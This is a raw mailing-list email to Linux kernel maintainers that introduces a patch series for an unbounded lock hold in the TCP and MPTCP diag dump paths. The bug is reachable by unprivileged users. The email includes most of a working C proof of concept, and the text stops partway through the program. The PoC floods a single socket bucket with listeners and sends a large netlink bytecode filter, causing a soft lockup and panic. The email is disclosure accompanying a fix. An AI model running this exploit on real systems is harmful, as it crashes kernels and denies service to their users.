Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 80EEE471D09
	for <mptcp@lists.linux.dev>; Wed, 29 Jul 2026 11:29:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785324571; cv=none; b=CKX65gydKOXudwyphEDGe+8uG/Q1Smv8MGpAk722eZR6ytnMcFai9bQfRzJ/qv5f64ibRRoV2o2hR98lFcAylKPGtUu9O92JwXRfD9QAduzOXvfyrdsTuOlo+pROia/wVK+BrLlUsmap0BRVEn6tL7rwTq9IsHzS8veK9Z4p2WI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785324571; c=relaxed/simple;
	bh=Jdqrw1yCGpc5ZsQRQEbv/LkJ8ektyqQDPwwRC2SevQ0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=XgWZ3MTHZMd2gjpBBxIE10Y5ghfrsWZEvQ7rHv2lzahIpH4dQ+MkoyE+FZcE3HgBybnj/AOnPj9Gj3cmbzyjGCVmCUC2ZvIlHq9oqlY88B87qR7T+aEThVYn9y6IuzJ1lKeNnaZNZHiGUlcrROQ6hRBPNFHSWiFjgiWk/1QfklM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=pSC8IS91; arc=none smtp.client-ip=209.85.214.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="pSC8IS91"
Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2d02b4c3601so2326985ad.3
        for <mptcp@lists.linux.dev>; Wed, 29 Jul 2026 04:29:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785324568; x=1785929368; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=RqIykc8OyQRzDA1n6J9vhqe58c0wydcYPwlXgUfeZWw=;
        b=pSC8IS91GEAGIy8yC31ZkI7+0Ex8L2XRIlwvdrJyNdRMF2nYxT5NY/1iRAdwfhCXt9
         wsAgc62pbHI5qxcF900V1OygUAvtBzoVaYSjN5av0r/LIVE62nJEq+W3bl+txWsH2Zh6
         KZg91uJ/jlKtdy3Bp35q4pH1EyZmM83gQWITi2VyoEywzQiMsAUbY+DrvmypBG8lLRoR
         Jdj+xzybepUkFGDI/KeiXELWh4GmiLX/zrXoHlBoILWPS7lx0HHqyYO6K6qQp0kykqcB
         kCXjQqhCr7yRZakafG7sPBz0UvoUgCXAukuNtK/UEzIeDet1PAg20qaUjstDkhGWp9Ob
         1U9Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785324568; x=1785929368;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=RqIykc8OyQRzDA1n6J9vhqe58c0wydcYPwlXgUfeZWw=;
        b=TraubX3yvd1FDnCgaSjKMzVAVnKE3TZ+Hjf2PPAYC6f4TYGSeDsHqQoFgU3MZpaf+G
         9nZWcK3Fxn168esRPcnlNPA2ndp0v9XbPFAm3G/a6F3HPjoVDhw3Q4E0Yqml9mA6Z8tO
         Dj7djgdyrZeJNpqacgFMSoQaIgMBaqkYPXvjfCS4kiMoZzHspa15QNiRC8KYgp4hpjoB
         VyJIuiHrarHRFgTesoutJ3fzukOR8OAZiYQO+era1H/LwHzFfQiH2YHRszUrr4a8h6QM
         TKlIH5eTp099uZ9mgT7ZuCH2w86wHdFrUX4jWU7LlFbTnITTNOg1wNYaPsOyEcFgJOuv
         JUWA==
X-Forwarded-Encrypted: i=1; AHgh+RqeKgvf+6WdiYjH2n5gL69trgrX43GvMNyCVlBi55N/m8DhFSS1YGx1f54/s+xTW+9UBzOG4A==@lists.linux.dev
X-Gm-Message-State: AOJu0YyowmeT+Qjj4giaeNdwC5KSpspA/w3pa8vOPoxIw7quoqTlSjbY
	NJvyapAHfGv34X2sY4Bi6C7QWz2Pr2LAe/zfi3IDf3UH9imGCLC8KB0+LbpqKtUzlXvN
X-Gm-Gg: AR+sD11lhVsn3CYyZeBrJB+OiinpTKClK03ZEHtoEr5x+y/2nkUs9Hy6QjZaPufKezc
	r62l7E6BMhLiQjZFmrmQosFU0XyS/2mqQ7011QwPXI5pcBQxGCTzrinEOPiXlJo1//09Zprd5da
	uRIMSxsmwLRM840jZ5ahSkCHMJAzOyUchxR24ljnzciBBRnf/pcxHdnLAmST53C/537c+dU5R3c
	VlJMU7Mg1CkWFDvW7GnT7dpPbp54eQDI3l3w8Tqnx2IPzz14F1QqJ2OCCvDQOc1H586CEWtBD3Y
	KXkGwxmA+JqAqiT044sf5pIXvvDCAGVLpzbT3G1Wkbvj3uDf5B+Xqh0ixlRXGOgWx5DWI19qh8H
	nKZtztRhf/Q6jACTWV/flUQzGd8rQCYTd5rSpueh6o54HqbASHsiVDyjj+K7tjBFLJqOF0SSyWH
	+rB3veMBVRwSKxuJ0wRzzZ15g8mrbLFWVoHZ/4/s2i5ODb3281BMHsTnATog11vr2T+OjsABfSP
	RHaFEtP9iM=
X-Received: by 2002:a17:903:2a88:b0:2ca:d820:b9a6 with SMTP id d9443c01a7336-2d015c37959mr75213045ad.23.1785324567451;
        Wed, 29 Jul 2026 04:29:27 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d022c55a7dsm9898505ad.84.2026.07.29.04.29.21
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 04:29:26 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	mptcp@lists.linux.dev
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	ncardwell@google.com,
	kuniyu@google.com,
	dsahern@kernel.org,
	kees@kernel.org,
	matttbe@kernel.org,
	martineau@kernel.org,
	geliang@kernel.org,
	fw@strlen.de,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/2] tcp: diag: fix unbounded bucket lock hold in diag dump paths
Date: Wed, 29 Jul 2026 11:28:38 +0000
Message-ID: <cover.1785307984.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: mptcp@lists.linux.dev
List-Id: <mptcp.lists.linux.dev>
List-Subscribe: <mailto:mptcp+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:mptcp+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,=0D
=0D
We found and validated a issue in net/ipv4/tcp_diag.c and=0D
net/mptcp/mptcp_diag.c. The bug is reachable by a=0D
non-root user via user and net namespace.=0D
We've tested it, and it should not affect any other functionality.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
inet_diag TCP dumps currently execute attacker-controlled=0D
INET_DIAG_REQ_BYTECODE programs while still holding the listener,=0D
bind, or ehash bucket locks in tcp_diag_dump(). If the bucket is=0D
heavily populated and the bytecode is a large reject-all filter, the=0D
dump path can spend an unbounded amount of time under the same bucket=0D
lock while walking attacker-arranged sockets.=0D
=0D
The reproduced listener case places 131072 SO_REUSEPORT listeners onto=0D
one colliding listener bucket and then issues a NETLINK_SOCK_DIAG dump=0D
request with 16380 INET_DIAG_BC_NOP instructions followed by a failing=0D
INET_DIAG_BC_D_EQ test. Because every socket runs the full bytecode and=0D
none reaches the reply fill path, skb backpressure does not terminate the=0D
walk early. On the unfixed kernel this triggers a watchdog soft lockup=0D
and then a panic in inet_diag_bc_sk().=0D
=0D
The earlier batching fix direction was still too narrow: it only counted=0D
sockets that survived the cheap prefilters and reached the expensive dump=0D
path. An attacker can therefore populate one bucket with many sockets or=0D
listeners that fail the netns/family/port or MPTCP-specific prefilters,=0D
causing the same bucket lock to be scanned far past the 16-entry batch=0D
threshold before control is returned.=0D
=0D
The same root cause also exists in MPTCP listener dumping. The=0D
MPTCP-specific mptcp_diag_dump_listeners() path reuses sk_diag_dump(),=0D
which runs inet_diag_bc_sk() before filling the netlink reply, while the=0D
listener bucket lock is still held.=0D
=0D
We additionally profiled the MPTCP-specific path locally with a=0D
separate debugging artifact. Because struct inet_diag_req_v2 stores=0D
sdiag_protocol in an __u8 field, that request must keep=0D
sdiag_protocol =3D IPPROTO_TCP and pass INET_DIAG_REQ_PROTOCOL =3D=0D
u32(IPPROTO_MPTCP), otherwise 262 truncates back to TCP and never reaches=0D
the MPTCP handler. With that corrected request, a 1-group run with 32768=0D
listeners and 16380 NOP bytecode steps took 2082.608 ms on the fixed=0D
kernel versus 8.601 ms on the unfixed kernel, and kprobe profiling showed=0D
inet_diag_bc_sk() executing 32768 times on the fixed kernel but only 256=0D
times on the unfixed one. That 256-count is not a missed path: the=0D
unfixed mptcp_diag_dump_listeners() reuses one counter both as the=0D
in-bucket index and as the resume cursor, so each dump restart advances=0D
in a triangular skip pattern and stops after approximately sqrt(2N)=0D
bytecode executions. The inline reproducer and decoded crash log below=0D
cover the TCP panic path; the MPTCP results above are included only as=0D
supporting local validation for the second patch.=0D
=0D
This series fixes both sites by keeping bucket-locked sections limited to=0D
raw socket collection and lifetime pinning, and moving all filtering,=0D
inet_diag_bc_sk(), and socket filling work out of the locked regions so=0D
the batch limit applies to raw bucket traversal itself. For TCP listener,=0D
bind, and ehash buckets, and for the MPTCP listener bucket, restarts now=0D
keep a referenced dump cursor so the next batch resumes after the=0D
previous socket instead of rescanning the bucket head under the same=0D
lock.=0D
=0D
For the TCP patch, the underlying root cause predates modern git history.=0D
The Fixes tag therefore uses commit 1da177e4c3f4=0D
("Linux-2.6.12-rc2") as the earliest git-import boundary that still=0D
anchors the pre-git bug in the current repository, rather than=0D
incorrectly attributing it to a later helper or refactor commit. The=0D
MPTCP patch uses the real introduction boundary, commit 4fa39b701ce9=0D
("mptcp: listen diag dump support").=0D
=0D
Reproducer:=0D
=0D
    gcc -O2 -static -o poc poc.c=0D
    unshare -Urn ./poc=0D
=0D
For the reproduced panic log below, we enabled=0D
softlockup panic sysctls and ran the local helper that executes:=0D
=0D
    ./poc --listen --groups 4 --stride 2048 --count 32768 --nops 16380=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc.c------=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/inet_diag.h>=0D
#include <linux/netlink.h>=0D
#include <linux/sock_diag.h>=0D
#include <linux/tcp.h>=0D
#include <sched.h>=0D
#include <stdbool.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/resource.h>=0D
#include <sys/socket.h>=0D
#include <sys/time.h>=0D
#include <time.h>=0D
#include <unistd.h>=0D
=0D
#ifndef SOL_TCP=0D
#define SOL_TCP 6=0D
#endif=0D
=0D
#ifndef TCP_LISTEN=0D
#define TCP_LISTEN 10=0D
#endif=0D
=0D
#define TCPF_LISTEN (1U << TCP_LISTEN)=0D
=0D
#define DEFAULT_SOCKETS 32768U=0D
#define DEFAULT_NOPS 16380U=0D
#define DEFAULT_REPEAT 1U=0D
#define DEFAULT_GROUPS 1U=0D
#define DEFAULT_STRIDE 2048U=0D
#define DEFAULT_BASE_PORT 10000=0D
#define MAX_NOPS 16380U=0D
#define RECV_BUF_SIZE (1U << 20)=0D
=0D
struct options {=0D
	unsigned int sockets;=0D
	unsigned int nops;=0D
	unsigned int repeat;=0D
	unsigned int groups;=0D
	unsigned int stride;=0D
	unsigned int cpu;=0D
	bool cpu_set;=0D
	bool compare;=0D
	bool attack;=0D
	bool listen_mode;=0D
	int port;=0D
};=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr,=0D
		"Usage: %s [--count N] [--nops N] [--repeat N] [--port P] [--cpu N]\n"=0D
		"          [--groups N] [--stride N] [--compare] [--no-attack]\n"=0D
		"          [--listen | --bound]\n"=0D
		"Defaults: --count %u --nops %u --repeat %u\n",=0D
		prog, DEFAULT_SOCKETS, DEFAULT_NOPS, DEFAULT_REPEAT);=0D
}=0D
=0D
static long long timespec_delta_ns(const struct timespec *start,=0D
				       const struct timespec *end)=0D
{=0D
	return (end->tv_sec - start->tv_sec) * 1000000000LL +=0D
	       (end->tv_nsec - start->tv_nsec);=0D
}=0D
=0D
static int raise_nofile_limit(rlim_t needed)=0D
{=0D
	struct rlimit lim;=0D
=0D
	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("getrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (lim.rlim_cur >=3D needed)=0D
		return 0;=0D
=0D
	if (lim.rlim_max < needed)=0D
		needed =3D lim.rlim_max;=0D
=0D
	lim.rlim_cur =3D needed;=0D
	if (setrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("setrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("getrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (lim.rlim_cur < needed) {=0D
		fprintf(stderr, "RLIMIT_NOFILE stayed at %llu, need %llu\n",=0D
			(unsigned long long)lim.rlim_cur,=0D
			(unsigned long long)needed);=0D
		return -1;=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
static int pin_to_cpu(unsigned int cpu)=0D
{=0D
	cpu_set_t set;=0D
=0D
	CPU_ZERO(&set);=0D
	CPU_SET(cpu, &set);=0D
	if (sched_setaffinity(0, sizeof(set), &set) < 0) {=0D
		perror("sched_setaffinity");=0D
		return -1;=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
static int create_socket_in_bucket(bool listen_mode, int port, int *bound_p=
ort)=0D
{=0D
	struct sockaddr_in addr =3D {=0D
		.sin_family =3D AF_INET,=0D
		.sin_addr.s_addr =3D htonl(INADDR_ANY),=0D
	};=0D
	socklen_t addrlen =3D sizeof(addr);=0D
	int one =3D 1;=0D
	int fd;=0D
=0D
	fd =3D socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP);=0D
	if (fd < 0) {=0D
		perror("socket(AF_INET, SOCK_STREAM)");=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {=0D
		perror("setsockopt(SO_REUSEADDR)");=0D
		goto err;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0) {=0D
		perror("setsockopt(SO_REUSEPORT)");=0D
		goto err;=0D
	}=0D
=0D
	addr.sin_port =3D htons(port);=0D
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {=0D
		perror("bind");=0D
		goto err;=0D
	}=0D
=0D
	if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {=0D
		perror("getsockname");=0D
		goto err;=0D
	}=0D
=0D
	if (listen_mode) {=0D
		if (listen(fd, 0) < 0) {=0D
			perror("listen");=0D
			goto err;=0D
		}=0D
	}=0D
=0D
	*bound_port =3D ntohs(addr.sin_port);=0D
	return fd;=0D
err:=0D
	close(fd);=0D
	return -1;=0D
}=0D
=0D
static int setup_sockets(bool listen_mode, unsigned int groups,=0D
			 unsigned int count_per_group, unsigned int stride,=0D
			 int requested_port, int **fds_out, int *port_out)=0D
{=0D
	int *fds;=0D
	unsigned int g, i;=0D
	unsigned int total =3D groups * count_per_group;=0D
	int base_port =3D requested_port ? requested_port : DEFAULT_BASE_PORT;=0D
=0D
	fds =3D calloc(total, sizeof(*fds));=0D
	if (!fds) {=0D
		perror("calloc(socket fds)");=0D
		return -1;=0D
	}=0D
=0D
	for (g =3D 0; g < groups; g++) {=0D
		int port =3D base_port + (int)(g * stride);=0D
=0D
		if (port <=3D 0 || port > 65535) {=0D
			fprintf(stderr, "port overflow for group %u (base=3D%d stride=3D%u)\n",=
=0D
				g, base_port, stride);=0D
			goto err;=0D
		}=0D
=0D
		for (i =3D 0; i < count_per_group; i++) {=0D
			unsigned int idx =3D g * count_per_group + i;=0D
			int bound_port =3D port;=0D
			int fd =3D create_socket_in_bucket(listen_mode, bound_port,=0D
							 &bound_port);=0D
=0D
			if (fd < 0) {=0D
				fprintf(stderr,=0D
					"socket setup failed at group %u index %u (port %d)\n",=0D
					g, i, port);=0D
				goto err;=0D
			}=0D
=0D
			fds[idx] =3D fd;=0D
			if ((idx + 1) % 4096U =3D=3D 0 || idx + 1 =3D=3D total) {=0D
				printf("sockets_ready=3D%u group=3D%u port=3D%d mode=3D%s\n",=0D
				       idx + 1, g + 1, port,=0D
				       listen_mode ? "listen" : "bound");=0D
			}=0D
		}=0D
	}=0D
=0D
	*fds_out =3D fds;=0D
	*port_out =3D base_port;=0D
	return 0;=0D
err:=0D
	for (i =3D 0; i < total; i++) {=0D
		if (fds[i] > 0)=0D
			close(fds[i]);=0D
	}=0D
	free(fds);=0D
	return -1;=0D
}=0D
=0D
static void teardown_sockets(int *fds, unsigned int count)=0D
{=0D
	unsigned int i;=0D
=0D
	if (!fds)=0D
		return;=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		if (fds[i] >=3D 0)=0D
			close(fds[i]);=0D
	}=0D
	free(fds);=0D
}=0D
=0D
static size_t build_request(void *buf, bool listen_mode, bool with_attack,=
=0D
			    unsigned int nops)=0D
{=0D
	size_t msg_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2));=0D
	struct nlmsghdr *nlh =3D buf;=0D
	struct inet_diag_req_v2 *req;=0D
=0D
	memset(buf, 0, msg_len);=0D
	nlh->nlmsg_len =3D msg_len;=0D
	nlh->nlmsg_type =3D SOCK_DIAG_BY_FAMILY;=0D
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_DUMP;=0D
	nlh->nlmsg_seq =3D 1;=0D
=0D
	req =3D NLMSG_DATA(nlh);=0D
	req->sdiag_family =3D AF_INET;=0D
	req->sdiag_protocol =3D IPPROTO_TCP;=0D
	req->idiag_states =3D listen_mode ? TCPF_LISTEN : (1U << 12);=0D
	req->id.idiag_cookie[0] =3D INET_DIAG_NOCOOKIE;=0D
	req->id.idiag_cookie[1] =3D INET_DIAG_NOCOOKIE;=0D
=0D
	if (with_attack) {=0D
		size_t payload_len =3D ((size_t)nops + 2U) *=0D
				     sizeof(struct inet_diag_bc_op);=0D
		size_t attr_len =3D NLA_HDRLEN + payload_len;=0D
		struct nlattr *nla =3D (struct nlattr *)((char *)buf + msg_len);=0D
		struct inet_diag_bc_op *ops;=0D
		unsigned int i;=0D
=0D
		memset(nla, 0, NLA_ALIGN(attr_len));=0D
		nla->nla_type =3D INET_DIAG_REQ_BYTECODE;=0D
		nla->nla_len =3D attr_len;=0D
		ops =3D (struct inet_diag_bc_op *)((char *)nla + NLA_HDRLEN);=0D
=0D
		for (i =3D 0; i < nops; i++) {=0D
			ops[i].code =3D INET_DIAG_BC_NOP;=0D
			ops[i].yes =3D sizeof(struct inet_diag_bc_op);=0D
			ops[i].no =3D 0;=0D
		}=0D
=0D
		ops[nops].code =3D INET_DIAG_BC_D_EQ;=0D
		ops[nops].yes =3D 2U * sizeof(struct inet_diag_bc_op);=0D
		ops[nops].no =3D 3U * sizeof(struct inet_diag_bc_op);=0D
=0D
		ops[nops + 1].code =3D 0;=0D
		ops[nops + 1].yes =3D 0;=0D
		ops[nops + 1].no =3D 1;=0D
=0D
		msg_len +=3D NLA_ALIGN(attr_len);=0D
		nlh->nlmsg_len =3D msg_len;=0D
	}=0D
=0D
	return msg_len;=0D
}=0D
=0D
static int recv_until_done(int fd)=0D
{=0D
	char *buf;=0D
	int ret =3D 0;=0D
=0D
	buf =3D malloc(RECV_BUF_SIZE);=0D
	if (!buf) {=0D
		perror("malloc(recv buf)");=0D
		return -1;=0D
	}=0D
=0D
	for (;;) {=0D
		ssize_t received =3D recv(fd, buf, RECV_BUF_SIZE, 0);=0D
		struct nlmsghdr *nlh;=0D
		int remaining;=0D
=0D
		if (received < 0) {=0D
			perror("recv");=0D
			ret =3D -1;=0D
			break;=0D
		}=0D
=0D
		if (received =3D=3D 0) {=0D
			fprintf(stderr, "recv: unexpected EOF\n");=0D
			ret =3D -1;=0D
			break;=0D
		}=0D
=0D
		remaining =3D (int)received;=0D
		for (nlh =3D (struct nlmsghdr *)buf; NLMSG_OK(nlh, remaining);=0D
		     nlh =3D NLMSG_NEXT(nlh, remaining)) {=0D
			if (nlh->nlmsg_type =3D=3D NLMSG_DONE)=0D
				goto out;=0D
=0D
			if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) {=0D
				const struct nlmsgerr *err =3D NLMSG_DATA(nlh);=0D
=0D
				if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {=0D
					fprintf(stderr, "short NLMSG_ERROR\n");=0D
				} else if (err->error) {=0D
					errno =3D -err->error;=0D
					perror("netlink");=0D
				} else {=0D
					fprintf(stderr, "unexpected ACK\n");=0D
				}=0D
				ret =3D -1;=0D
				goto out;=0D
			}=0D
		}=0D
	}=0D
=0D
out:=0D
	free(buf);=0D
	return ret;=0D
}=0D
=0D
static int run_dump(bool listen_mode, bool with_attack, unsigned int nops,=
=0D
		    double *wall_ms)=0D
{=0D
	size_t request_len;=0D
	size_t attr_space =3D with_attack ?=0D
			    NLA_ALIGN(NLA_HDRLEN +=0D
				      ((size_t)nops + 2U) *=0D
				      sizeof(struct inet_diag_bc_op)) : 0;=0D
	size_t alloc_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2)) +=0D
			   attr_space;=0D
	struct sockaddr_nl local =3D {=0D
		.nl_family =3D AF_NETLINK,=0D
	};=0D
	struct sockaddr_nl kernel =3D {=0D
		.nl_family =3D AF_NETLINK,=0D
	};=0D
	struct timeval timeout =3D {=0D
		.tv_sec =3D 60,=0D
		.tv_usec =3D 0,=0D
	};=0D
	struct iovec iov;=0D
	struct msghdr msg =3D {=0D
		.msg_name =3D &kernel,=0D
		.msg_namelen =3D sizeof(kernel),=0D
		.msg_iov =3D &iov,=0D
		.msg_iovlen =3D 1,=0D
	};=0D
	struct timespec start_ts;=0D
	struct timespec end_ts;=0D
	void *request;=0D
	int fd;=0D
	int ret =3D -1;=0D
=0D
	request =3D malloc(alloc_len);=0D
	if (!request) {=0D
		perror("malloc(request)");=0D
		return -1;=0D
	}=0D
=0D
	request_len =3D build_request(request, listen_mode, with_attack, nops);=0D
=0D
	fd =3D socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_SOCK_DIAG);=0D
	if (fd < 0) {=0D
		perror("socket(AF_NETLINK)");=0D
		free(request);=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0=
) {=0D
		perror("setsockopt(SO_RCVTIMEO)");=0D
		goto out;=0D
	}=0D
=0D
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {=0D
		perror("bind(netlink)");=0D
		goto out;=0D
	}=0D
=0D
	iov.iov_base =3D request;=0D
	iov.iov_len =3D request_len;=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC_RAW, &start_ts) < 0) {=0D
		perror("clock_gettime(start)");=0D
		goto out;=0D
	}=0D
=0D
	if (sendmsg(fd, &msg, 0) < 0) {=0D
		perror("sendmsg");=0D
		goto out;=0D
	}=0D
=0D
	if (recv_until_done(fd) < 0)=0D
		goto out;=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC_RAW, &end_ts) < 0) {=0D
		perror("clock_gettime(end)");=0D
		goto out;=0D
	}=0D
=0D
	*wall_ms =3D (double)timespec_delta_ns(&start_ts, &end_ts) / 1000000.0;=0D
	ret =3D 0;=0D
=0D
out:=0D
	close(fd);=0D
	free(request);=0D
	return ret;=0D
}=0D
=0D
static int parse_u32(const char *arg, unsigned int *value)=0D
{=0D
	char *end =3D NULL;=0D
	unsigned long parsed;=0D
=0D
	parsed =3D strtoul(arg, &end, 0);=0D
	if (!end || *end || parsed > UINT32_MAX)=0D
		return -1;=0D
=0D
	*value =3D (unsigned int)parsed;=0D
	return 0;=0D
}=0D
=0D
static int parse_port(const char *arg, int *port)=0D
{=0D
	unsigned int value;=0D
=0D
	if (parse_u32(arg, &value) < 0 || value > 65535U)=0D
		return -1;=0D
=0D
	*port =3D (int)value;=0D
	return 0;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct options opts =3D {=0D
		.sockets =3D DEFAULT_SOCKETS,=0D
		.nops =3D DEFAULT_NOPS,=0D
		.repeat =3D DEFAULT_REPEAT,=0D
		.groups =3D DEFAULT_GROUPS,=0D
		.stride =3D DEFAULT_STRIDE,=0D
		.cpu =3D 0,=0D
		.cpu_set =3D false,=0D
		.compare =3D false,=0D
		.attack =3D true,=0D
		.listen_mode =3D true,=0D
		.port =3D 0,=0D
	};=0D
	int *fds =3D NULL;=0D
	int port =3D 0;=0D
	unsigned int i;=0D
=0D
	for (i =3D 1; i < (unsigned int)argc; i++) {=0D
		if (strcmp(argv[i], "--count") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.sockets) < 0 ||=0D
			    opts.sockets =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--nops") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.nops) < 0 ||=0D
			    opts.nops > MAX_NOPS) {=0D
				fprintf(stderr, "--nops must be in range [0, %u]\n",=0D
					MAX_NOPS);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--repeat") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.repeat) < 0 ||=0D
			    opts.repeat =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--groups") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.groups) < 0 ||=0D
			    opts.groups =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--stride") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.stride) < 0 ||=0D
			    opts.stride =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--port") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_port(argv[++i], &opts.port) < 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--cpu") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.cpu) < 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
			opts.cpu_set =3D true;=0D
		} else if (strcmp(argv[i], "--compare") =3D=3D 0) {=0D
			opts.compare =3D true;=0D
		} else if (strcmp(argv[i], "--no-attack") =3D=3D 0) {=0D
			opts.attack =3D false;=0D
		} else if (strcmp(argv[i], "--listen") =3D=3D 0) {=0D
			opts.listen_mode =3D true;=0D
		} else if (strcmp(argv[i], "--bound") =3D=3D 0) {=0D
			opts.listen_mode =3D false;=0D
		} else {=0D
			usage(argv[0]);=0D
			return 1;=0D
		}=0D
	}=0D
=0D
	if (opts.groups > UINT32_MAX / opts.sockets) {=0D
		fprintf(stderr, "socket count overflow\n");=0D
		return 1;=0D
	}=0D
=0D
	if (raise_nofile_limit((rlim_t)opts.sockets * opts.groups + 64U) < 0)=0D
		return 1;=0D
=0D
	if (opts.cpu_set && pin_to_cpu(opts.cpu) < 0)=0D
		return 1;=0D
=0D
	if (setup_sockets(opts.listen_mode, opts.groups, opts.sockets,=0D
			  opts.stride, opts.port, &fds, &port) < 0)=0D
		return 1;=0D
=0D
	printf("setup_complete groups=3D%u sockets_per_group=3D%u total_sockets=3D=
%u base_port=3D%d stride=3D%u mode=3D%s nops=3D%u repeat=3D%u compare=3D%s =
attack=3D%s\n",=0D
	       opts.groups, opts.sockets, opts.groups * opts.sockets,=0D
	       port, opts.stride, opts.listen_mode ? "listen" : "bound",=0D
	       opts.nops, opts.repeat,=0D
	       opts.compare ? "yes" : "no",=0D
	       opts.attack ? "yes" : "no");=0D
=0D
	if (opts.compare) {=0D
		double wall_ms;=0D
=0D
